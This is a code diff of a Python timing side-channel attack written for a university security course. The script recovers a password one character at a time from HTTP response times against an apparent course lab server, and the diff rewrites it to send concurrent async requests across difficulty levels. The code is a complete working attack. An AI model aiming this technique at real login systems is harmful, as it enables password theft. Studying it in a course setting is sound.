@@ -1,129 +1,38 @@
 """
-    Assignment 1.1 on Attacks On Implementations [CS - 3682] @ Runi
-    Timing-based password attack implementation using HTTP response timing differences.
-
-    developed by ID. 315388850
+    Assignment 1.2 on Attacks On Implementations [CS - 3682] @ Runi
+    Timing-based password attack implementation using HTTP response timing differences.    
 """
 
 from abc import ABC, abstractmethod
+from dataclasses import dataclass
+import statistics
 from typing import Dict, Any, List, Tuple
 
-import statistics
+import asyncio
+import aiohttp
+
 import string
 import time
 
-import requests
-from requests.adapters import HTTPAdapter
-
-
 # ==========================
-# Request Sender
+# Logging
 # ==========================
-class RequestSender(ABC):
-    """Abstract interface for sending requests to the victim server."""
-    @abstractmethod
-    def send(self, payload: Dict[str, Any]) -> Tuple[str, int]: ...
-    @abstractmethod
-    def close_sessions(self) -> None: ...
+class Logger:
+    def __init__(self, enabled: bool = True):
+        self.enabled = enabled
+
+    def log(self, msg: str = ""):
+        if self.enabled:
+            print(msg)
 
 
-class HTTPSender(RequestSender):
-    """HTTP-based request sender with connection pooling and warmup."""
-    def __init__(
-        self,
-        url: str,
-        base_payload: Dict[str, Any],
-        timeout_sec: float = 5.0
-    ):
-        self.url = url.rstrip("/") + "/"
-        self.timeout_sec = timeout_sec
-        self.fixed_payload = base_payload.copy()
-        self.session = self._setup_session()
-        self._do_initial_warmup()
-
-    def _setup_session(self) -> requests.Session:
-        """Create and configure a requests Session with connection pooling."""
-        session = requests.Session()
-        adapter = HTTPAdapter(pool_connections=10, pool_maxsize=10)
-        session.mount("http://", adapter)
-        return session
-
-    def _do_initial_warmup(self):
-        """Perform a few dummy requests to warm up connection pool"""
-        for i in range(3):
-            payload = {"password": f"warm{i}"}
-            try:
-                self.session.get(self.url, params=payload, timeout=2)
-            except:
-                pass
-
-    def send(self, variable_payload: Dict[str, Any]) -> Tuple[str, int]:
-        """Send a single request with combined fixed + variable payload.
-
-        Args:
-            variable_payload: Dynamic part of the query parameters.
-
-        Returns:
-            Tuple containing stripped response text and elapsed time in microseconds.
-            On error returns ("", 0).
-        """
-        request = self.fixed_payload.copy()
-        request.update(variable_payload)
-
-        try:
-            start_ns = time.perf_counter_ns()
-            res = self.session.get(self.url, params=request, timeout=self.timeout_sec)
-            elapsed_us = (time.perf_counter_ns() - start_ns) // 1000
-            return res.text.strip(), int(elapsed_us)
-        
-        except Exception:
-            return "", 0
-
-    def close_sessions(self):
-        try:
-            self.session.close()
-        except:
-            pass
-
-
-# ==========================
-# Sampler
-# ==========================
-class Sampler:
-    """Utility to collect multiple timing samples for a given payload."""
-    def __init__(self, sender: RequestSender):
-        """Initialize sampler with a request sender.
-
-        Args: 
-            sender: Object responsible for sending HTTP requests.
-        """
-        self.sender = sender
-
-    def run_sample(self, variable_payload: Dict[str, Any], n_samples: int = 1) -> Tuple[str, List[int]]:
-        """Run multiple requests and collect timing data.
-
-        Args:
-            variable_payload: Dynamic query parameters.
-            n_samples: Number of requests to perform.
-
-        Returns:
-            Tuple of (last_response_body, list_of_valid_timings_us).
-        """
-        times = []
-        last_body = ""
-
-        for _ in range(n_samples):
-            body, t = self.sender.send(variable_payload)
-            last_body = body
-            if t > 0:
-                times.append(t)
-
-        return last_body, times
+logger = Logger(enabled=False)
 
 
 # ==========================
 # Victim Server Configuration
 # ==========================
+@dataclass
 class VictimServer:
     """Configuration container for the target server."""
     def __init__(
@@ -155,6 +64,118 @@ class DecisionEngine(ABC):
     @abstractmethod
     def decide_top_k(self, candidates: Dict[str, List[int]], top_k: int) -> List[Tuple[str, float]]: ...
     """Return top-k candidates ranked by timing difference."""
+
+
+# ==========================
+# Request Sender
+# ==========================
+class RequestSender(ABC):
+    """Abstract interface for sending requests to the victim server."""
+    @abstractmethod
+    async def send(self, payload: Dict[str, Any]) -> Tuple[str, int]: ...
+    @abstractmethod
+    async def close_sessions(self) -> None: ...
+
+
+class AsyncHTTPSender(RequestSender):
+    """HTTP-based request sender with connection pooling and warmup."""
+    def __init__(
+        self,
+        url: str,
+        base_payload: Dict[str, Any],
+        timeout_sec: float = 5.0,
+        pool_size: int = 100 # שוּנה: הגדלת בריכת החיבורים ל-100
+    ):
+        self.url = url.rstrip("/") + "/"
+        self.fixed_payload = base_payload.copy()
+        self.pool_size = pool_size
+        self.session = None
+        self.timeout_sec = timeout_sec
+
+    async def _setup_session(self) -> None:
+        """Create and configure a requests Session with connection pooling."""
+        timeout = aiohttp.ClientTimeout(total=self.timeout_sec)
+        # שימוש ב-TCPConnector עם מגבלת חיבורים גבוהה
+        connector = aiohttp.TCPConnector(limit=self.pool_size, ssl=False) 
+        self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)
+
+
+    async def _do_initial_warmup(self) -> None:
+        """Perform a few dummy requests to warm up connection pool"""
+        # הרצת Warmup במקביל
+        tasks = []
+        for i in range(3):
+            payload = {"password": f"warm{i}"}
+            tasks.append(self.session.get(self.url, params=payload))
+        
+        try:
+            await asyncio.gather(*tasks, return_exceptions=True)
+        except:
+            pass
+            
+
+    async def init(self):
+        await self._setup_session()
+        await self._do_initial_warmup()
+
+
+    async def send(self, payload: Dict[str, Any]) -> Tuple[str, int]:
+        """Send a single request with combined fixed + variable payload.
+
+        Args:
+            payload: Dynamic part of the query parameters.
+
+        Returns:
+            Tuple containing stripped response text and elapsed time in microseconds.
+            On error returns ("", 0).
+        """
+        request = self.fixed_payload.copy()
+        request.update(payload)
+
+        try:
+            start_ns = time.perf_counter_ns()
+            
+            async with self.session.get(url=self.url, params=request) as response:
+                body_txt = (await response.text()).strip()
+            elapsed_us = (time.perf_counter_ns() - start_ns) // 1000
+
+            return body_txt, int(elapsed_us)
+            
+        except Exception:
+            # במקרה של שגיאה (Timeout או אחרת), מחזיר 0 שמהווה outlier ויוסר בדרך כלל
+            return "", 0
+
+    async def close_sessions(self):
+        if self.session:
+            await self.session.close()
+            self.session = None
+
+# ==========================
+# Sampler
+# ==========================
+class AsyncSampler:
+    """Utility to collect multiple timing samples for a given payload."""
+    def __init__(self, sender: RequestSender):
+        """Initialize sampler with a request sender.
+        Args:    
+            sender: Object responsible for sending HTTP requests.
+        """
+        self.sender = sender
+
+    async def run_sample(self, payload: Dict[str, Any], n_samples: int = 1) -> Tuple[str, List[int]]:
+        """Run multiple requests and collect timing data concurrently.
+        """
+        if isinstance(self.sender, AsyncHTTPSender) and self.sender.session is None:
+            await self.sender.init()
+
+        # הדגימות רצות במקביל! (כבר היה בקוד המקורי - נשמר)
+        tasks = [self.sender.send(payload) for _ in range(n_samples)]
+        results = await asyncio.gather(*tasks, return_exceptions=False)
+
+        bodies = [body for body, _ in results]
+        times = [elapsed_time for _, elapsed_time in results if elapsed_time > 0]
+        
+        return bodies[-1], times
 
 
 class MedianDecisionEngine(DecisionEngine):
@@ -215,7 +236,7 @@ class MedianDecisionEngine(DecisionEngine):
         scores = [(c, t - min_time) for c, t in cleaned.items()]
         scores.sort(key=lambda x: x[1], reverse=True)
         return scores[:top_k]
-
+    
 
 # ==========================
 # TimingAttacker - main logic
@@ -225,7 +246,7 @@ class TimingAttacker:
     def __init__(
         self,
         victim_server: VictimServer,
-        sender: HTTPSender,
+        sender: AsyncSampler,
         base_payload: Dict[str, Any],
         decision_engine: DecisionEngine,
         padding: str = "@"
@@ -241,12 +262,12 @@ class TimingAttacker:
         """
         self.victim = victim_server
         self.sender = sender
-        self.sampler = Sampler(sender)
+        self.sampler = AsyncSampler(sender)
         self.base_payload = base_payload
         self.decision_engine = decision_engine
         self.padding = padding
 
-    def detect_password_length(self) -> int:
+    async def detect_password_length(self) -> int:
         """Detect password length by observing timing differences for padded passwords.
 
         Returns:
@@ -256,18 +277,18 @@ class TimingAttacker:
         
         for length in range(1, self.victim.max_pwd_len + 1):
             payload = {"password": self.padding * length}
-            _, samples = self.sampler.run_sample(payload, n_samples=3)
+            _, samples = await self.sampler.run_sample(payload, n_samples=3)
             samples_for_len[length] = samples
 
         best_len = self.decision_engine.decide(samples_for_len)
         return best_len
 
-    def _measure_candidates(
+    async def _measure_candidates(
         self,
         candidates: List[str],
         prefix: str,
         suffix: str,
-        samples_per_candidate: int
+        new_samples_per_candidate: int
     ) -> Dict[str, List[int]]:
         """Measure timing for each candidate character at current position.
 
@@ -280,11 +301,19 @@ class TimingAttacker:
         Returns:
             Mapping of character -> list of timing samples.
         """
-        measures: Dict[str, List[int]] = {}
-        for char in candidates:
+        
+        async def get_samples_for_char(char: str) -> Tuple[str, List[int]]:
             payload = {"password": prefix + char + suffix}
-            _, samples = self.sampler.run_sample(payload, n_samples=samples_per_candidate)
+            _, samples = await self.sampler.run_sample(payload, n_samples=new_samples_per_candidate)
+            return char, samples
+        
+        tasks = [get_samples_for_char(char) for char in candidates]
+        results = await asyncio.gather(*tasks, return_exceptions=False)
+
+        measures: Dict[str, List[int]] = {}
+        for char, samples in results:
             measures[char] = samples
+
         return measures
 
     def _calc_gap(self, samples: Dict[str, List[int]]) -> Tuple[float, str]:
@@ -303,7 +332,7 @@ class TimingAttacker:
         second_time = sorted_med[1][1] if len(sorted_med) > 1 else best_time
         return best_time - second_time, best_char
 
-    def _attack_position(
+    async def _attack_position(
         self,
         prefix: str,
         suffix: str,
@@ -327,11 +356,15 @@ class TimingAttacker:
 
         while len(candidates) > 1 and round_number < max_rounds:
             round_number += 1
-
-            candidates_samples = self._measure_candidates(
+            
+            logger.log(f"       round num {round_number} | candidates: {candidates} | samples_p_candidates: {samples_per_candidate}")
+            
+            candidates_samples = await self._measure_candidates(
                 candidates, prefix, suffix, samples_per_candidate
             )
             gap, best_char = self._calc_gap(candidates_samples)
+
+            logger.log(f"       best_char '{best_char}' | gap {gap}")
 
             if gap >= min_gap_us:
                 return best_char
@@ -344,7 +377,7 @@ class TimingAttacker:
         return self.decision_engine.decide(candidates_samples)
 
 
-    def _attack_last_position(self, prefix: str) -> str:
+    async def _attack_last_position(self, prefix: str) -> str:
         """Brute-force the final character by checking for success response.
 
         Args:
@@ -353,21 +386,29 @@ class TimingAttacker:
         Returns:
             Complete password.
         """
-        for char in self.victim.alphabet:
+        async def get_resbody_for_char(char: str) -> Tuple[str, str]:
             payload = {"password": prefix + char}
-            body, _ = self.sampler.run_sample(payload, n_samples=1)
-            if body == "1":
-                return prefix + char
-        return prefix # as a fallback - in this case the attack failed
+            body_txt, _ = await self.sampler.run_sample(payload, n_samples=1)
+            return char, body_txt
+        
+        tasks = [get_resbody_for_char(char) for char in self.victim.alphabet]
+        results = await asyncio.gather(*tasks, return_exceptions=False)
 
-    def attack(
+        for char, body_txt in results:
+            if body_txt == "1":
+                return prefix + char
+
+        return prefix
+    
+
+    async def attack(
         self,
         password_len: int,
-        top_k: int = 3,
+        top_k: int = 5,
         max_rounds: int = 3,
-        sample_increment: int = 3,
-        max_samples: int = 11,
-        initial_samples: int = 2,
+        sample_increment: int = 2,
+        max_samples: int = 10,
+        initial_samples: int = 1,
         min_gap_microseconds: int = 200
     ) -> str:
         """Perform the complete timing attack.
@@ -387,11 +428,13 @@ class TimingAttacker:
         password = ""
         for pos in range(password_len):
             if pos == password_len - 1:
-                password = self._attack_last_position(prefix=password)
+                password = await self._attack_last_position(prefix=password)
                 break
-
+            
             suffix = self.padding * (password_len - len(password) - 1)
-            next_char = self._attack_position(
+            logger.log(f"    Attack position {pos} | prefix: {password} suffix: {suffix}")
+
+            next_char = await self._attack_position(
                 prefix=password,
                 suffix=suffix,
                 top_k=top_k,
@@ -404,39 +447,51 @@ class TimingAttacker:
             password += next_char
 
         return password
-
+    
 
 # ==========================
 # Main
 # ==========================
-def main():
+async def main():
     BASE_URL = "http://aoi-assignment1.oy.ne.ro:8080/"
 
-    USERNAME = "123456789"    
-    DIFFICULTY = 1
+    USERNAME = "315388850"    
+    
+    try:
+        for d in range(1, 6):
 
-    base_payload = {
-        "user": USERNAME,
-        "difficulty": DIFFICULTY
-    }
+            DIFFICULTY = d
 
-    victim = VictimServer(url=BASE_URL)
-    http_sender = HTTPSender(url=victim.url, base_payload=base_payload)
-    median_decision_engine = MedianDecisionEngine(min_samples=max(2, DIFFICULTY))
+            base_payload = {
+                "user": USERNAME,
+                "difficulty": DIFFICULTY
+            }
 
-    attacker = TimingAttacker(
-        victim_server=victim,
-        sender=http_sender,
-        base_payload=base_payload,
-        decision_engine=median_decision_engine
-    )
+            victim = VictimServer(url=BASE_URL)
+            async_http_sender = AsyncHTTPSender(url=victim.url, base_payload=base_payload)
+            median_decision_engine = MedianDecisionEngine(min_samples=max(2, DIFFICULTY))
 
-    print(f"[{time.ctime()}] Start Attack on:  [{BASE_URL}] difficulty {DIFFICULTY}")
-    password_length = attacker.detect_password_length()
-    print(f"[{time.ctime()}] Detect PWD Len: {password_length}")
-    password = attacker.attack(password_len=password_length)
-    print(f"\n[{time.ctime()}] FINAL PASSWORD: {password}")
+            attacker = TimingAttacker(
+                victim_server=victim,
+                sender=async_http_sender,
+                base_payload=base_payload,
+                decision_engine=median_decision_engine
+            )
+
+            print(f"[+] [{time.ctime()}] Start Attack on: [{BASE_URL}] difficulty {DIFFICULTY}")
+
+            password_length = await attacker.detect_password_length()
+            print(f"    (-) {time.ctime()} Detect PWD Len: {password_length}")
+
+            password = await attacker.attack(password_len=password_length)
+            print(f"    (-) {time.ctime()} FINAL PASSWORD: {password}")
+
+            await async_http_sender.close_sessions()
+            
+    except Exception as e:
+        await async_http_sender.close_sessions()
+
 
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
